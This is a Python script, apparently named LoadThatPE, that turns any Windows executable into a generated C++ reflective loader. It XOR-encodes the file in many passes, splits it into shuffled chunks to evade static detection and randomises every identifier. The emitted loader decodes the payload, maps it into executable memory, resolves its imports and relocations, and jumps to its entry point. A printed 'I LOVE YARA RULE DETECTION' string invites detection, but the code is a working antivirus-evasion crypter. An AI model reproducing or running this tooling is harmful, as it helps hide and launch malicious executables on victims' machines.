import sys
import os
import random
import string

def generate_random_name(prefix="", length=20):
    return prefix + ''.join(random.choices(string.ascii_letters, k=length))

def generate_encrypted_pe_chunks(input_file, output_file=None, chunk_size=256):

    # Opening destination file
    with open(input_file, 'rb') as f:
        pe_data = f.read()

    # multiple XOR obfuscation on bytes
    num_xor_pass = random.randint(10, 20)

    print(f"[+] Number of XOR encoding : " + str(num_xor_pass))
    encrypted_pe = bytearray(pe_data)
    xor_keys = []
    xor_str = ""
    for _ in range(num_xor_pass):
        xor_key = random.randint(0xAA, 0xFF) # random xor key each time
        xor_str += str(f"0x{xor_key:02X} ")
        for i in range(len(encrypted_pe)):
            encrypted_pe[i] ^= xor_key 
        xor_keys.append(xor_key)
    print(f"[+] Random XOR keys : " + str(xor_str))

    # Payload chunking to evade static detection
    chunks = []
    chunk_names = []
    total_size = len(encrypted_pe)
    original_order = []
    print(f"[+] Chunking PE bytes...")
    for i in range(0, len(encrypted_pe), chunk_size):
        chunk = encrypted_pe[i:i+chunk_size]
        chunk_name = generate_random_name("")
        chunk_names.append(chunk_name)
        chunks.append((chunk_name, chunk))
        original_order.append(len(chunks)-1)
    random.shuffle(original_order)
    print(f"[+] Number of chunks : " + str(len(chunks)))

    # Polymorphic replacement
    print(f"[+] Randomizing names...")
    var_names = {
        # Global names
        "DecryptAndValidatePE": generate_random_name(""),
        "MapPEToMemory": generate_random_name(""),
        "SetMemoryPermissions": generate_random_name(""),
        "ResolveImports": generate_random_name(""),
        "RelocatePE": generate_random_name(""),
        "ExecutePE": generate_random_name(""),
        "numXorPass": generate_random_name(""),
        "start": generate_random_name(""),
        "xorKeys": generate_random_name(""),
        "encryptedPESize": generate_random_name(""),
        "rand_i1": generate_random_name(""),
        "rand_i2": generate_random_name(""),
        "rand_i3": generate_random_name(""),
        "rand_i4": generate_random_name(""),
        "rand_i5": generate_random_name(""),
        "rand_i6": generate_random_name(""),
        "rand_i7": generate_random_name(""),
        "rand_i8": generate_random_name(""),
        "rand_i9": generate_random_name(""),
        "rand_i10": generate_random_name(""),
        "decryptedPE": generate_random_name(""),
        "dosHeader": generate_random_name(""),
        "ntHeaders": generate_random_name(""),
        # reconstructEncryptedPE
        "reconstructEncryptedPE": generate_random_name(""),
        "completeData": generate_random_name(""),
        # getDecryptedPE
        "getDecryptedPE" : generate_random_name(""),
        "encryptedData": generate_random_name(""),
        # MapPEToMemory
        "executableMemory": generate_random_name(""),
        "section": generate_random_name(""),
        # SetMemoryPermissions
        "sectionHeaders": generate_random_name(""),
        "oldProtect": generate_random_name(""),
        "newProtect": generate_random_name(""),
        # ResolveImports
        "importDescriptor": generate_random_name(""),
        "moduleName": generate_random_name(""),
        "module": generate_random_name(""),
        "thunkOriginal": generate_random_name(""),
        "thunk": generate_random_name(""),
        "importByName": generate_random_name(""),
        # RelocatePE
        "relocationDirectory": generate_random_name(""),
        "delta": generate_random_name(""),
        "relocation": generate_random_name(""),
        "relocationEntries": generate_random_name(""),
        "patchAddress": generate_random_name(""),
        # ExecutePE
        "context": generate_random_name(""),
        "entryPoint": generate_random_name(""),
        # main
        "mainThreadHandle": generate_random_name(""),
    }

    # C++ code recipe
    print(f"[+] C++ code generation...")
    cpp_code = f"#include <windows.h>\n"
    cpp_code += f"#include <iostream>\n"
    cpp_code += f"#include <vector>\n"
    cpp_code += f"#include <cstring>\n"
    cpp_code += f"#include <stdexcept>\n"
    cpp_code += f"#include <algorithm>\n\n"
    cpp_code += f"const size_t {var_names['encryptedPESize']} = {total_size};\n"

    # Payload chunks decoding
    for idx in original_order:
        chunk_name, chunk = chunks[idx]
        line_length = 16
        chunk_str = f"unsigned char {chunk_name}[] = {{\n"
        for j in range(0, len(chunk), line_length):
            line = ', '.join(f"0x{byte:02X}" for byte in chunk[j:j+line_length])
            chunk_str += "    " + line + ",\n"
        chunk_str += "};\n\n"
        cpp_code += chunk_str

    cpp_code += f"unsigned char* {var_names['reconstructEncryptedPE']}() "
    cpp_code += "{\n"
    cpp_code += f"    unsigned char* {var_names['completeData']} = new unsigned char[{total_size}];\n"
    cpp_code += "    size_t currentPos = 0;\n\n"
    cpp_code += f"    DWORD {var_names['start']} = GetTickCount();\n\n"

    for i in range(len(chunks)):
        chunk_name, _ = chunks[i]
        cpp_code += f"    memcpy({var_names['completeData']} + currentPos, {chunk_name}, sizeof({chunk_name}));\n"
        cpp_code += f"    currentPos += sizeof({chunk_name});\n"
        cpp_code += f"    {var_names['start']} = GetTickCount();\n"
        cpp_code += f"    while (GetTickCount() - {var_names['start']} < "
        cpp_code += str(random.randint(1, 10))
        cpp_code += ") {\n";
        cpp_code += f"       for (volatile int {var_names['rand_i10']} = 0; {var_names['rand_i10']} < "
        cpp_code += str(random.randint(1, 10))
        cpp_code += f"; {var_names['rand_i10']}++);\n";
        cpp_code += "    }\n";

    cpp_code += f"    return {var_names['completeData']};\n"
    cpp_code += "}\n\n"

    # Multiple XOR decoding
    cpp_code += f"const int {var_names['numXorPass']} = {num_xor_pass};\n"
    cpp_code += f"const unsigned char {var_names['xorKeys']}[] = {{"
    cpp_code += ", ".join(f"0x{key:02X}" for key in xor_keys)
    cpp_code += "};\n"
    cpp_code += f"""
    unsigned char* {var_names['getDecryptedPE']}() {{
        unsigned char* {var_names['encryptedData']} = {var_names['reconstructEncryptedPE']}();
        for (int {var_names["rand_i8"]} = 0; {var_names["rand_i8"]} < {var_names['numXorPass']}; ++{var_names["rand_i8"]}) {{
            for (size_t {var_names["rand_i9"]} = 0; {var_names["rand_i9"]} < {var_names['encryptedPESize']}; ++{var_names["rand_i9"]}) {{
                {var_names['encryptedData']}[{var_names["rand_i9"]}] ^= {var_names['xorKeys']}[{var_names["rand_i8"]}];
            }}
        }}
        return {var_names['encryptedData']};
    }}
    """

    # ExecPE functions
    cpp_code += f"""
    unsigned char* {var_names["DecryptAndValidatePE"]}() {{
        unsigned char* {var_names["decryptedPE"]} = {var_names['getDecryptedPE']}();
        IMAGE_DOS_HEADER* {var_names["dosHeader"]} = reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["decryptedPE"]});
        if ({var_names["dosHeader"]}->e_magic != IMAGE_DOS_SIGNATURE) {{
            exit(1);
        }}
        IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>({var_names["decryptedPE"]} + {var_names["dosHeader"]}->e_lfanew);
        if ({var_names["ntHeaders"]}->Signature != IMAGE_NT_SIGNATURE) {{
            exit(1);
        }}
        if ({var_names["ntHeaders"]}->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {{
            exit(1);
        }}
        return {var_names["decryptedPE"]};
    }}

    unsigned char* {var_names["MapPEToMemory"]}(unsigned char* {var_names["decryptedPE"]}) {{
        IMAGE_DOS_HEADER* {var_names["dosHeader"]} = reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["decryptedPE"]});
        IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>({var_names["decryptedPE"]} + {var_names["dosHeader"]}->e_lfanew);
        if ({var_names["ntHeaders"]}->FileHeader.NumberOfSections == 0) {{
            exit(1);
        }}
        unsigned char* {var_names["executableMemory"]} = reinterpret_cast<unsigned char*>(VirtualAlloc(
            nullptr,
            {var_names["ntHeaders"]}->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        ));
        if (!{var_names["executableMemory"]}) {{
            exit(1);
        }}
        memcpy({var_names["executableMemory"]}, {var_names["decryptedPE"]}, {var_names["ntHeaders"]}->OptionalHeader.SizeOfHeaders);
        IMAGE_SECTION_HEADER* {var_names["section"]} = IMAGE_FIRST_SECTION({var_names["ntHeaders"]});
        for (int {var_names["rand_i1"]} = 0; {var_names["rand_i1"]} < {var_names["ntHeaders"]}->FileHeader.NumberOfSections; ++{var_names["rand_i1"]}) {{
            if ({var_names["section"]}[{var_names["rand_i1"]}].PointerToRawData + {var_names["section"]}[{var_names["rand_i1"]}].SizeOfRawData > {var_names["encryptedPESize"]}) {{
                exit(1);
            }}
            if ({var_names["section"]}[{var_names["rand_i1"]}].VirtualAddress + {var_names["section"]}[{var_names["rand_i1"]}].Misc.VirtualSize > {var_names["ntHeaders"]}->OptionalHeader.SizeOfImage) {{
                exit(1);
            }}
            memset({var_names["executableMemory"]} + {var_names["section"]}[{var_names["rand_i1"]}].VirtualAddress, 0, {var_names["section"]}[{var_names["rand_i1"]}].Misc.VirtualSize);
            if ({var_names["section"]}[{var_names["rand_i1"]}].SizeOfRawData > 0) {{
                memcpy({var_names["executableMemory"]} + {var_names["section"]}[{var_names["rand_i1"]}].VirtualAddress,
                    {var_names["decryptedPE"]} + {var_names["section"]}[{var_names["rand_i1"]}].PointerToRawData,
                    {var_names["section"]}[{var_names["rand_i1"]}].SizeOfRawData);
            }}
        }}
        return {var_names["executableMemory"]};
    }}

    void {var_names["SetMemoryPermissions"]}(unsigned char* {var_names["executableMemory"]}, IMAGE_NT_HEADERS* {var_names["ntHeaders"]}) {{
        IMAGE_SECTION_HEADER* {var_names["sectionHeaders"]} = IMAGE_FIRST_SECTION({var_names["ntHeaders"]});
        for (int {var_names["rand_i2"]} = 0; {var_names["rand_i2"]} < {var_names["ntHeaders"]}->FileHeader.NumberOfSections; ++{var_names["rand_i2"]}) {{
            DWORD {var_names["oldProtect"]};
            DWORD {var_names["newProtect"]} = PAGE_READONLY;

            if ({var_names["sectionHeaders"]}[{var_names["rand_i2"]}].Characteristics & IMAGE_SCN_MEM_EXECUTE) {{
                {var_names["newProtect"]} = ({var_names["sectionHeaders"]}[{var_names["rand_i2"]}].Characteristics & IMAGE_SCN_MEM_WRITE)
                    ? PAGE_EXECUTE_READWRITE
                    : PAGE_EXECUTE_READ;
            }}
            else if ({var_names["sectionHeaders"]}[{var_names["rand_i2"]}].Characteristics & IMAGE_SCN_MEM_WRITE) {{
                {var_names["newProtect"]} = PAGE_READWRITE;
            }}

            if (!VirtualProtect({var_names["executableMemory"]} + {var_names["sectionHeaders"]}[{var_names["rand_i2"]}].VirtualAddress,
                {var_names["sectionHeaders"]}[{var_names["rand_i2"]}].Misc.VirtualSize,
                {var_names["newProtect"]}, &{var_names["oldProtect"]})) {{
                exit(1);
            }}

        }}
    }}

    void {var_names["ResolveImports"]}(IMAGE_NT_HEADERS* {var_names["ntHeaders"]}, unsigned char* {var_names["executableMemory"]}) {{
        try {{
            IMAGE_IMPORT_DESCRIPTOR* {var_names["importDescriptor"]} = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>({var_names["executableMemory"]} + {var_names["ntHeaders"]}->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
            if (!{var_names["importDescriptor"]}) {{
                exit(1);
            }}
            while ({var_names["importDescriptor"]}->Name) {{
                char* {var_names["moduleName"]} = reinterpret_cast<char*>({var_names["executableMemory"]} + {var_names["importDescriptor"]}->Name);
                if (!{var_names["moduleName"]}) {{
                    exit(1);
                }}
                HMODULE {var_names["module"]} = LoadLibraryA({var_names["moduleName"]});
                if (!{var_names["module"]}) {{
                    exit(1);
                }}
                IMAGE_THUNK_DATA* {var_names["thunkOriginal"]} = reinterpret_cast<IMAGE_THUNK_DATA*>({var_names["executableMemory"]} + {var_names["importDescriptor"]}->OriginalFirstThunk);
                IMAGE_THUNK_DATA* {var_names["thunk"]} = reinterpret_cast<IMAGE_THUNK_DATA*>({var_names["executableMemory"]} + {var_names["importDescriptor"]}->FirstThunk);
                while ({var_names["thunkOriginal"]}->u1.AddressOfData) {{
                    if ({var_names["thunkOriginal"]}->u1.Ordinal & IMAGE_ORDINAL_FLAG) {{
                        auto {var_names["rand_i3"]} = static_cast<WORD>({var_names["thunkOriginal"]}->u1.Ordinal & 0xFFFF);
                        {var_names["thunk"]}->u1.Function = reinterpret_cast<ULONGLONG>(GetProcAddress({var_names["module"]}, reinterpret_cast<LPCSTR>({var_names["rand_i3"]})));
                    }}
                    else {{
                        IMAGE_IMPORT_BY_NAME* {var_names["importByName"]} = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>({var_names["executableMemory"]} + {var_names["thunkOriginal"]}->u1.AddressOfData);
                        if (!{var_names["importByName"]}->Name) {{
                            exit(1);
                        }}
                        {var_names["thunk"]}->u1.Function = reinterpret_cast<ULONGLONG>(GetProcAddress({var_names["module"]}, {var_names["importByName"]}->Name));
                    }}
                    if (!{var_names["thunk"]}->u1.Function) {{
                        exit(1);
                    }}
                    ++{var_names["thunkOriginal"]};
                    ++{var_names["thunk"]};
                }}
                ++{var_names["importDescriptor"]};
            }}
        }}
        catch (const std::exception& {var_names["rand_i4"]}) {{
            exit(1);
        }}
        catch (...) {{
            exit(1);
        }}
    }}

    void {var_names["RelocatePE"]}(unsigned char* {var_names["executableMemory"]}, IMAGE_NT_HEADERS* {var_names["ntHeaders"]}) {{
        IMAGE_DATA_DIRECTORY {var_names["relocationDirectory"]} = {var_names["ntHeaders"]}->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if ({var_names["relocationDirectory"]}.VirtualAddress == 0 || {var_names["relocationDirectory"]}.Size == 0) return;

        DWORD64 {var_names["delta"]} = reinterpret_cast<DWORD64>({var_names["executableMemory"]}) - {var_names["ntHeaders"]}->OptionalHeader.ImageBase;

        IMAGE_BASE_RELOCATION* {var_names["relocation"]} = reinterpret_cast<IMAGE_BASE_RELOCATION*>
            ({var_names["executableMemory"]} + {var_names["relocationDirectory"]}.VirtualAddress);

        while ({var_names["relocation"]}->VirtualAddress != 0) {{
            DWORD {var_names["rand_i5"]} = ({var_names["relocation"]}->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* {var_names["relocationEntries"]} = reinterpret_cast<WORD*>({var_names["relocation"]} + 1);

            for (DWORD {var_names["rand_i6"]} = 0; {var_names["rand_i6"]}  < {var_names["rand_i5"]}; {var_names["rand_i6"]}++) {{
                if ({var_names["relocationEntries"]}[{var_names["rand_i6"]}] >> 12 == IMAGE_REL_BASED_DIR64) {{
                    DWORD64* {var_names["patchAddress"]} = reinterpret_cast<DWORD64*>({var_names["executableMemory"]} + {var_names["relocation"]}->VirtualAddress + ({var_names["relocationEntries"]}[{var_names["rand_i6"]}] & 0xFFF));
                    *{var_names["patchAddress"]} += {var_names["delta"]};
                }}
            }}

            {var_names["relocation"]} = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                reinterpret_cast<unsigned char*>({var_names["relocation"]}) + {var_names["relocation"]}->SizeOfBlock);
        }}
    }}

    void {var_names["ExecutePE"]}(unsigned char* {var_names["executableMemory"]}, HANDLE {var_names["mainThreadHandle"]}) {{
        IMAGE_DOS_HEADER* {var_names["dosHeader"]} = reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["executableMemory"]});
        IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>({var_names["executableMemory"]} + {var_names["dosHeader"]}->e_lfanew);
        CONTEXT {var_names["context"]} = {{}};
        {var_names["context"]}.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext({var_names["mainThreadHandle"]}, &{var_names["context"]})) {{
            exit(1);
        }}
        DWORD64 {var_names["entryPoint"]} = {var_names["ntHeaders"]}->OptionalHeader.AddressOfEntryPoint + reinterpret_cast<DWORD64>({var_names["executableMemory"]});

        if ({var_names["entryPoint"]} < reinterpret_cast<DWORD64>({var_names["executableMemory"]}) ||
            {var_names["entryPoint"]} >= (reinterpret_cast<DWORD64>({var_names["executableMemory"]}) + {var_names["ntHeaders"]}->OptionalHeader.SizeOfImage)) {{
            exit(1);
        }}
        {var_names["context"]}.Rip = {var_names["entryPoint"]};
        if (!SetThreadContext({var_names["mainThreadHandle"]}, &{var_names["context"]})) {{
            exit(1);
        }}
    }}

    int main() {{
    """

    # FOR YARA RULE DETECTION <3
    # Please, be kind, let SOC analysts detect us.
    cpp_code += f"""
    std::cout << "[I LOVE YARA RULE DETECTION]" << std::endl;
    """

    cpp_code += f"""
        HANDLE {var_names["mainThreadHandle"]} = GetCurrentThread();
        unsigned char* {var_names["decryptedPE"]} = {var_names["DecryptAndValidatePE"]}();
        unsigned char* {var_names["executableMemory"]} = {var_names["MapPEToMemory"]}({var_names["decryptedPE"]});
        IMAGE_NT_HEADERS* {var_names["ntHeaders"]} = reinterpret_cast<IMAGE_NT_HEADERS*>({var_names["executableMemory"]} + reinterpret_cast<IMAGE_DOS_HEADER*>({var_names["executableMemory"]})->e_lfanew);
        {var_names["ResolveImports"]}({var_names["ntHeaders"]}, {var_names["executableMemory"]});
        {var_names["RelocatePE"]}({var_names["executableMemory"]}, {var_names["ntHeaders"]});
        {var_names["SetMemoryPermissions"]}({var_names["executableMemory"]}, {var_names["ntHeaders"]});
        {var_names["ExecutePE"]}({var_names["executableMemory"]}, {var_names["mainThreadHandle"]});
        return 0;
    }}
    """
    if output_file:
        with open(output_file, 'w') as out_file:
            out_file.write(cpp_code)
        print(f"[+] File successfully created : {output_file}")
    else:
        print(cpp_code)


if __name__ == "__main__":
    print(f"***************************************")
    print(f"************ LoadThatPE ***************")
    print(f"******** Yara rule edition ************")
    print(f"***************************************")
    print(f"\n")

    if len(sys.argv) < 2:
        print("Usage : python encrypt_pe.py <fichier_PE> [output_file] [chunk_size]")
        sys.exit(1)
    input_path = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) > 2 else None
    chunk_size = int(sys.argv[3]) if len(sys.argv) > 3 else 256
    if not os.path.exists(input_path):
        print(f"[-] File not found : {input_path}")
        sys.exit(1)
    generate_encrypted_pe_chunks(input_path, output_path, chunk_size)

